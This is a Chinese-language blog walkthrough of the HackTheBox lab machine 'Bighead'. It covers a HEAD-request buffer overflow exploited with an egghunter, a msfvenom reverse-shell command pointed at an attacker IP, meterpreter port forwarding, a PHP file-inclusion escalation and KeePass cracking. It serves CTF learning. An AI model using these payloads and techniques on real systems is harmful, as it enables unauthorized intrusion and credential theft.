> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HvUE8gPiVzOjQ3wDLhlSaQ)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **81** 篇文章，本公众号会每日分享攻防渗透技术给大家。

靶机地址：https://www.hackthebox.eu/home/machines/profile/164

靶机难度：疯狂（7.0/10）

靶机发布日期：2019 年 5 月 5 日

靶机描述：

Bighead is an “Insane” difficulty windows box which deals with advanced binary exploitation, registry enumeration, code review and NTFS ADS. The source code of the web server is found on github which needs to be analyzed to find an overflow in a HEAD request. It can be exploited using heap spraying and egg hunting which results in a shell. Registry enumeration leads to hex encoded password for nginx which is used to obtain an ssh shell through port forward. On reviewing the PHP code a file vulnerable to LFI is found which is exploited to gain a root shell. The root flag has an ADS which is a keepass database. This is cracked using the key to gain the final flag.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/Rf4us6EbTGkXOS2YevxdwcHFx3DAA8icYWW2BftiabHPxibgeibaES5ibFpS2HibtAhIfzpFp7JMDB5Qy1UicFhD1nsRg/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt3icibWhibAHpMguoneFvHD1ZJ94TKAjfXFiaIKdjJKuTv9qAV45moKJh8Q/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.112....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt120SCiceUY28BibaSrDZ4y7ysKSbcNyLAPvABoqhfClxQUT8ia0JyT79g/640?wx_fmt=png)

nmap 可以看到在端口 80 上运行了 nginx 服务...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtX77S0SySCh7oXTxqanxPodlsuEGFuicuqtZWonISvtib7qFLdSkuowtA/640?wx_fmt=png)

Nginx 正在运行一个网站，描绘了一家与加密货币相关的公司...

网站底下是个表格，目前没发现什么有利用的信息... 爆破看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBticzqCSFPw2icuwbL1U8WUw8lNx79RgciaDib9HegrPqNvxvwGOgiaG2FibuQ/640?wx_fmt=png)

爆破发现了五个有效的目录... 试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtU2aGTYXC2tM05Eeia7icIoWKWNVgcZdjzpIgQ0oOYR5icOWK1dBNhaXJQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt6icOHr9ibNSQdLVleXRcl8iaTAZzGAJYLb43BElwCHtzekTTXhmf99HHg/640?wx_fmt=png)

可以看到，访问 / backend 重定向到了 http://10.10.10.112/BigHead 页面报 404 错误...

访问 / updatecheck 重定向到了 http://code.bighead.htb/phpmyadmin/phpinfo.php 这个页面...

这是暴露了子域名，这提示了需要我添加子域名...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtJiaA1Ugvt080ml467NQTXyLibzHW8EYvhibLVEqxYrpwK8bfsOib6A0wZQ/640?wx_fmt=png)

添加完后，进到了 phpinfo() 页面...

可以看到系统版本是：Windows Server 2008 SP 2 32 的

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt4zgndv34wcjxrKdVpXHdWPueTrBg8r6SDkIPy1eFDqpKTrOa5Ctf5Q/640?wx_fmt=png)

发现了挺多目录..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtBwsU3zZ1pDc7FVCaicOu1P8O3W2aqoFKrC5WQH2nkJcbJUXokwqtPicA/640?wx_fmt=png)

访问 dashboard 发现了存在 XAMPP，这是建设 apache 下的一个建站集成软件... 说明这里存在了 apache...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtjKwsdzMZB2srrtt9MeOaxt7t6tQgxCHYJtDLFnHBvNjeDuzuJZhPrg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtt77O4po5F22ysmvNwOyZv4tVKyp4H8UBfWLggAwFsj0evbjSVmrhTA/640?wx_fmt=png)

果然存在 apache.... 然后点击 parent... 返回了 404，定向到了 http://127.0.0.1:5080/testlink/login.php 页面...

最初在 nmap 扫描发现 Nginx 在端口 80 上运行，但是在这里运行了 Apache。这意味着 Nginx 可能充当 Apache 前面的反向代理或负载平衡器身份...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtPwO93ZCtFVQDBstnMG4267ZIfnUVSzUNgM2hQROFOnhbflol3stvKA/640?wx_fmt=png)

这里直接对 testlink 进行了爆破，发现了很多信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtxbXhgvg0ibBOuzibl0lT5NVaHdH80JewoKoTo8QZicibfqlab7b9icRIkbA/640?wx_fmt=png)

在 note 子目录下发现了域名信息..

意思是 Bighead 破坏了该应用程序，Dinesh 告诉他获得自己的 DEV 的子域... 说明这里存在 dev 子域名... 试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtAnhQMtEPiaqtsiaAoyeqZ6170WGCqm2LPrVtO13icmeKreFjRrE8V5cibw/640?wx_fmt=png)

说明是存在的.... 一张头像图... 没有用的信息...

继续爆破...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBttAeSLS6XOLYkrriaUwoO132r2lgfd853dvqHChqSC4DsU60MVulAJcw/640?wx_fmt=png)

可以看到 / coffee 目录传回了 418 错误信息... 去研究下

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtebqSFPRsLeuibT2UKuB5Ffx4ichkNaQziaXepI1UYAia6DqFKI1osIzamA/640?wx_fmt=png)

可以看到它在运行着别的 web 服务器...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBty0Tz1wBOwSxxK37iaOib2Gzg8Ukmb9SFj5fehTtMlYicEoyyeJSWzCFLQ/640?wx_fmt=png)

运行着服务：

```
BigheadWebSvr 1.0
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtniajJuGPqYHBiblbVbqFjbJd1Jia6wxjapxjtOl2d9H6fn5U2J4picsBhg/640?wx_fmt=png)

```
https://github.com/3mrgnc3/BigheadWebSvr
```

google 搜索到了 BigheadWebSvr 1.0 软件库...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt6Ia7jkmAnfXH6TCmVXSSeLFOgnu0IU8Bb3XjL26C1Covd119Y2AR8w/640?wx_fmt=png)

可以看到 BHWS_Backup.zip 已经加密了...

这里利用 john 进行对文件夹破解即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtxy0PcX9Vzz1HOficgRhlwX3oV6RGfZ5WHnhA4urzXf7hg47DZt7B0LA/640?wx_fmt=png)

```
zip2john BHWS_Backup.zip > hash.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtNWuOGjGcF6dC8YGDmHdVY7zR6NAvbwEU0LEKTicSZWKicXXeEIRIJpSg/640?wx_fmt=png)

```
john -w=/usr/share/wordlists/rockyou.txt --fork=4 hash.txt
```

成功破解哈希值，获得压缩包密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt3vePuvGjSf8Oas1GB4RlyvoIwy1yjxxC32uuOUVNW115WIJeDgDOaA/640?wx_fmt=png)

意思是易受攻击的软件已从其中删除，也许它存在于较早的版本中... 去 github 找找看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtBrUlhxHImoWaiacxmtickicicJwDvzViad6DLGTX1Cq3m74fYqfsndjdZibw/640?wx_fmt=png)

在导航的地方发现了历史版本，下载继续破解试试查看下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtx3hMXafOZic5LmkrYGPuIsmqeDoFUW2FBtUHKibQmNvnczUpCyWSAvUQ/640?wx_fmt=png)

可以看到，历史版本，源文件还在....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtcpg9rBug2VCYgTnsQA3dDic6usxSTDjPpVWEOAspLqRh2VxfqeDHlibg/640?wx_fmt=png)

在 nginx.conf 文件中可以看到它自定义 Web 服务器提供对 dev.bighead.htb 的请求，以及 / coffee 对它们的请求，来源于 / coffee 的 proxy_pass_header Server 配置文件...

这里开始分析 BHWS_Backup 里的文件... 这里我在 windows10 32 系统上也搭建了 BHWS_Backup 服务... 开始分析二进制程序

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtO1JKtwU9j4bcTQxY2wknL49y6MfIIGdXndhs8DHkyvr7ibvSOLKEqqQ/640?wx_fmt=png)

这里将文件考入 windows10 系统即可... 运行会提示缺少 libmingwex-0.dll 文件... 下载：

```
[libmingwex-0.dll](https://sourceforge.net/projects/mingw/files/MinGW/Base/mingwrt/mingwrt-5.0.2/libmingwex-5.0.2-mingw32-dll-0.tar.xz/download)
```

然后在 windows10 安装：

```
[Immunity Debugger](https://www.Immunityinc.com/products/debugger)
```

用来分析二进制程序....  

最后，目前最新版的 Immunity 是基于 python2.7 库运行的... 这里需要分析溢出的偏移量找到注入 shellcode 的点，需要：

```
[mona](https://github.com/corelan/mona)
```

放入 Immunity 的 python 库进行分析... 否则无法分析！！  

下载所有环境工具后，开始搭建环境...

可以看到已经成功运行... 端口 8008 开放了

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtdlkMRk856XZFZ7SibaFaWeh08dMIVfibIzAqFlI86olFoTKESjSjztvA/640?wx_fmt=png)

可以看到访问 windows10 的 IP，服务是正常运行的，和靶机一样显示了头像..curl 测试也是正常的...

环境搭建好了... 最初的思路是 BigheadWebSvr.exe 可能存在缓冲区溢出... 这里开始测试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtqwUfFdSf0QJjRPMUiaIHY1H369ibic8ribxJYiaXvQUWtg080m5jqY93Ozw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtibpCRFicBBsUvdrQqCRpgTe05G0OC9otY4zY7OPKywDQW1fpEHkBkCcA/640?wx_fmt=png)

通过 python 写入 head 栈堆 128 个字符 A，服务崩溃了... 程序存在溢出问题...

这里开始利用 Immunity Debugger 分析程序...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtCStehpdfialyuOj6m9uMdLrAYa56ZtQKDpOGjibxAPLxLXiaY26YdE4OA/640?wx_fmt=png)

可以看到 EIP 被 A 覆盖，需要找到 EIP 的位置...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtKSicjJOLic50DIPjvLCX06tFPgHuKia0yyDOduAn4Z6lV1G210uiaHfHLQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt6IujQd8CWibOQH9CxIF9AJJ9mRlJNSqxxtpFTa40q5WzyxlGmbiby8Gg/640?wx_fmt=png)

这里先开启 KALI 和 windows10 的共享.. 方便操作！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtysfogv7apEhDlwTFM2taJCUV7zib8J2q8rBWD8AibCC4dzwteUKpBFgQ/640?wx_fmt=png)

```
!mona pattern_create 128
```

在之前已经写入了 128A 得字节，找到了缓冲出的位置点...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtYtHNDjiaBl5slAkJ7SzANG94uPp9RGDsZyzJL9Q6TNgwSd28DiasrrFQ/640?wx_fmt=png)

```
!mona config -set workingfolder z:\
```

这里利用 mona 脚本对程序的溢出值偏移量写入 SMB 中... 打开发现内容不是我想要的... 内容应该是：

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtVswdO6HQnobuhhTH5jDH4BHo2LxesCW2zC8UkIqsvribKeJyz4fjwzQ/640?wx_fmt=png)

将偏移量写入 txt 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtbPR9qDSr0OSUdQUaL235mSB8q4ZbTsNAzJR7VicatGStU7kRL2rY3eg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt24qNJyibgc3D5iaQ6l7BtUptwaDIcjSK7wlmzBCJ1y9Kd7prsicvVTejw/640?wx_fmt=png)

重新运行服务，将偏移量写入 head 后，找到了坏死的 EIP 溢出崩溃点的位置：ACC54AAC

找到了 EIP 崩溃的位置点，下一步需要找到覆盖 EIP 点，继续找到 EAX 变量...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtAgtia9uVKDMX4miay9nevLEBbHxQvQoLTW4eVCT8elsNU5jk5w3aiaib1w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtPVwSZz7Uzsqo84PXpN6KIeu6R9OPJdZekOzGJkjKl5kOYOzPyRo14w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtkKE5U76z3zoejcwgDuTeib97w1nHFicRN7UXPBibywEw1PkTYXR47PzOA/640?wx_fmt=png)

可以看到起点 EAX 在 AA0A，和偏移量是一样的...

然后回到崩溃的 ACC54AAC 位置，显示的是 C5、4A 位置... 所以位置量是 AA~C3 位置：72

得出 EAX=68，EIP=72，ESP=80

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtxZdq839I1ehQJrRJAoUDI6oSXoZBkicibdH2gmJHlZLVcDUHNZAhuCzg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtcZc0MlNliaG4neu9AUUZkr5sypiboia6dzPM5xQeDGArbaScc0344CTag/640?wx_fmt=png)

可以看到通过写入 ABCD 字节发现 CC~CC，4 个字节成功覆盖了 EIP，右上角 EIP 显示了 CCCCCCCC，找到了控制的 EIP 量需要继续找到一个真实的地址来覆盖 EIP...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt0qsQXgdGuhFax902ZXOm5X5QtQBkyFsRmSbcL15taUIEKiciaVlr7Qmw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtCmm1z1v37LGgCZUQ3SmzCXonicicYuwALfnibWKAsQhcibFZsqDO49meRw/640?wx_fmt=png)

这里需要找到 EGG，由于 egghunter 位于堆栈上，因此使用 jmp esp 指令使其跳转到 egghunter 并执行它，!mona jmp -r esp，执行后生成了 jmp.txt 文件，需要确保选择的地址可以在目标计算机上使用，命令：!mona modules 看到，选择使用 dll 了服务器本身的地址之一 bHeadSvr.dll... 继续测试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtTEicUUc5icByvIKGd7BJhwIHXhHPmRDnu0BLqj8oDFLiboINueLNyjgVg/640?wx_fmt=png)

通过 bHeadSvr.dll 可以看到：

```
JMP_ESP：625012F0
JMP_EAX：625012F2
```

继续收集信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtS1RMxDZfxlsngFWjJJ5cyic7tZTpf4gI1zY7ehuCTRx5x5QEia2KnweA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtmpKbBziasiaMpgSC7UEPBpAXlmt1DYM9CKO7Ala5CIPVBJmjvWEtKeZg/640?wx_fmt=png)

收集到 egghunter 值....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtekiaUbaNK3n65Iq2EJW7OjlrqQ9HhTs6wNwth7kfdia6XKruFArZpzCw/640?wx_fmt=png)

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.11.128 LPORT=443 -f python -o dayushell.py
```

msfvenom 生成 shell，开始写 EXP

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtcLAtG3xYLuhc6QqZQIicm8ratArV0SbDwG0HSHSMfvgsSxBvTcPAAgw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtTThhAtzgAFjK2lPdqj9OhFvUIaIpUL9q5T6kp9f0ibg8qXc2V0NEnEg/640?wx_fmt=png)

可以看到编写完了 EXP... 测试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtibcsDSAiaI9kkSdz31AOTPuf1KYPG0POdjrPkx0MC3IhccAAUclrI1UQ/640?wx_fmt=png)

没报错，运行中... 执行看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt0eVTY6jA2MJWTpCcLVcdg4fNRe2f1lhv1dCiaMXp4zgXa6uDepaFjJg/640?wx_fmt=png)

回看 EXP 应该是没问题的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtCN21ZAicQfZpRTaicb9w8Z3OKuGwTY7iaqNMCFao4W0S4d3cAZRJKISicg/640?wx_fmt=png)

由于这是 head 偏移量溢出，而这里的头部信息太多了，需要微调，删除这些信息进行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt7yrGxEV3e8jYskic4N7aqDMHzNvxLcOORK3pyJXZYmhxBT7mT4KFtxg/640?wx_fmt=png)

执行后还是报错了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtpvrViamJVQcvBb5ubHWxwcKZpzNVicciczJo0vGibjrGCVG6nHun9aYI4Q/640?wx_fmt=png)

当 egghunter 扫描内存时，CPU 使用率会在几秒钟内达到 100％..

这里等大概 10 多秒就能成功提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtsP4BnTx7PfWxkZmzxJoTdw8GFKDqRhas4rhbwKp6kb5rlibmZKicEYyQ/640?wx_fmt=png)

这里只需要将 EXP 里 IP 和端口修改成靶机即可相同提权...

这里遇到了坑，搞得我反反复复检查 EXP 至少几十遍，来来回回分析 BigheadWebSvr.exe 几十遍... 花了 2 天多的时间... 硬是没在靶机上提权成功...

原因找到了... 我 EXP 是没问题的... 是因为当 EXP 执行后，BigheadWebSvr.exe 服务会吃 windows server 2008 系统 CPU 到 %100，靶机就会延迟性很高，最近 HTB 也 windows 有点问题，估计是数据包传输的问题，延迟了几十分钟...

我怎么过的？

我都差点放弃了，放着继续尝试的心态，执行了 EXP，然后放着吃饭带娃，等了两小时回来，发现成功提权了... 狗血！！

可以看到成功获得 nelson 低权用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtGTqHuloK8uJbLopBE1OAA5htp31OqkKXvJ8z4gtLJDMeVibDktibIIlA/640?wx_fmt=png)

获得了 user 信息... 可这肯定不是用户标志... 继续提权..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtujD0EG4d0VxtRvubp8V4A7uicEM6k4wtfeP8dZ0Q5VNGVBmiaLajMfww/640?wx_fmt=png)

有了前面的坑，我直接利用 meterpreter 进行提权操作，不然万一关了，我还得等几小时...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtbpLmSlnaEjM7qQibKDzY98coKMvcwvebFIY2w81uKKwjeiaQrbfgFSYg/640?wx_fmt=png)

成功！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtPFkAN0YvtZj60S1qzNrKA5skB9iaIbK1C5QTWtNlCiaicebW7XibjGOiaWQ/640?wx_fmt=png)

```
run post/windows/gather/enum_applications
```

可以看到该系统装了 7z、ssh、keepass...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtFSgrxWjMe61ib4cb1ohXmJmxfBg3D0agKr1xFDct5QMqQPvLiaMLe2KQ/640?wx_fmt=png)

这里 2020 和 5080 端口引起我关注...XAMPP 的 Bv Ssh 和 httpd 的 apache 服务..... 深入查询...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtERfSkER51lzpRc2ajsXiafH3SWhvXBFnCB8ptR6uDZ2q6PoqeL7xOtA/640?wx_fmt=png)

```
portfwd add -l 2020 -p 2020 -r 127.0.0.1
```

通过 meterpreter 转发 2020 端口，可以简单地使用 portfwd...

可以看到可以登陆... 存在该服务... 需要密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBts4nn3ER2pds7gxsb3dXJahCmI2QC27ibTNUB4kMUrTYatREWhuteiaYA/640?wx_fmt=png)

Bv Ssh 是 nginx 的一个服务，在找 nginx 注册表发现了 nginx.reg 存在有用信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt2UE4mPIP5XV1NS5rCEd2oF1Gl9OXnKH6ckTuWFmjHp9UJPQ5E4xRhA/640?wx_fmt=png)

存在 Authenticate 密钥包和 PasswordHash 哈希值... 这是 ASCII 值

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtt9bq9qibwe4QldWia4fsEJK5BSMAVPO3aRcKKAqNdibGkgp0OawqdicqicA/640?wx_fmt=png)

成功解码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtEj1mORTGSDIb13GQRPYzv5sLU5RUvUwkdr8rdbNBN2Y04nwyV6AknQ/640?wx_fmt=png)

成功进入 bvshell... 前面就说了 BVssh 是 XAMPP 服务，进来是 bvshell 就正常的

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtKtMIhdFJoPSC4gYIUjl9VEUAkXsJ4I7I4ZVWWlA7lj4icibdjzFLGSuQ/640?wx_fmt=png)

这里面无法执行命令...（或者我不懂）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtuJtqQ72icldUd36RX5iafnIaCb5L07Zh3mV5bvib2kFicia7ysuEvBfWCAw/640?wx_fmt=png)

这里找了一会，浏览 code.bighead.htb 发现重定向到了 http://127.0.0.1:5080/testlink/login.php 地址...

去看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtIFXVgetwBJ8DWRyzRbfia7jtO5Ht3oJicGwekq0UPpiaN7AjcbKJrGR6w/640?wx_fmt=png)

我又回到了 bvshell

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtQfZVMIIxB64mcRyffLicgbPwjkNV5g8BFGFX9FGZGysRu7e3Y2thzhw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtVjr7XoUT4wvAVaL250NgdWFnuypNBSiaN7E7BGSAicMDFAvBGaVhBGRQ/640?wx_fmt=png)

文件包含一个 LFI，这里 PiperID 和 PiperCoinID，PiperCoinID 很重要，PiperCoinID 采用的值将其分配给另一个名为的变量 $PiperCoinAuth 与 require_once() 和 $PiperCoinAuth 相呼应...

$PiperCoinAuth 是通过 POST PiperCoinID 参数用户直接控制的，所以可以写入和读取包含任意 PHP 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtWVZUAByWia3vxPPz9JiaYdYGU7NBnficLocYKBPAZjb0benoMsrY2umIA/640?wx_fmt=png)

成功利用 PiperID=&PiperCoinID 执行 php 文件进行提权...

这里利用 NC 是因为 msfven.. 生成的 shell 不稳定，时不时会断开...

成功获得 system 权限，管理员

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt6GMc9uMC40licbpEMVUOjTWmmkou3jOcayEPHe7jkjic7STVQrqkBCFA/640?wx_fmt=png)

成功获得 user 信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBt5WWxEOuUkWzLibcfxyoftImNNWHm8TfIxU0BqFl58b0yOm9N18D1RBQ/640?wx_fmt=png)

开始发现没用 root 信息... 想到数据流查看，果然发现了，打开后....

完全没用的信息... 又是编码图形化界面...

没这么简单啊！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtG5GM0jXIPXgp9kqjhXcJklmVDDVjP6LvQMHnibztmicUwWPMfXwxKcOA/640?wx_fmt=png)

继续往下查看... 存在 root.txt:Zone.Identifier 文件... 我利用最前开启的 smbserver 进行共享...

下载了 root.txt 到本地是成功了，但是 root.txt:Zone.Identifier 是不成功的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtWKZ1VE4mDnZrTk5sxM2iaVsJetQXsC1pzFbDQAK0INlqkTROnQGSGiag/640?wx_fmt=png)

利用 mv 修改文件名，查看到了内容，是乱码，但是一看就知道这是二进制文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBticzDSOic9WXJNLbwHUbNMwtQ3ABCzQWKcORZpcEMzSabYa85XX5g1TicA/640?wx_fmt=png)

修改文件名后可以共享了... 共享到了本地

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtYRJYL4rXXcFdic61qG3qxLSVBxvxicpTib5B3mAq3P3T4TW7QfawEe0XQ/640?wx_fmt=png)

通过 file 查看到了这是. kdbx 文件... 需要利用 keepass2 打开，apt install keepass2，打开后发现还需要密码！！！

快疯了...

找了半天没发现什么有用的信息...

回看自己收集的信息... 前面就发现了这台靶机安装了 keepass 程序... 肯定存在目录.. 走

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtFiafCStbrVhH7Vibcfm1k5WsZXZdNwtibOF9Wr36m2JqfS8AIGFFKMjgw/640?wx_fmt=png)

找到了该目录... 发现 KeePass.config.xml 页面代码... 查看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtibJVhicViat2iab1HHsL1CnUSOtwT50ibfBibSJmnGIsrDdvab8wY1FBibpFQ/640?wx_fmt=png)

查看跳到直接跳到最后... 发现了 root.txt:Zone.Identifier 文件的 keyfilepath 存在 admin.png 文件内...

Users\Administrator\Pictures\admin.png

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMb2ltvicPtLEWnYbGLMDFBtLvrPNj3maRK13y49tAVISh7aia8OoljwwfLw2tp4tqT4Z2Ricjc8W4CQ/640?wx_fmt=png)

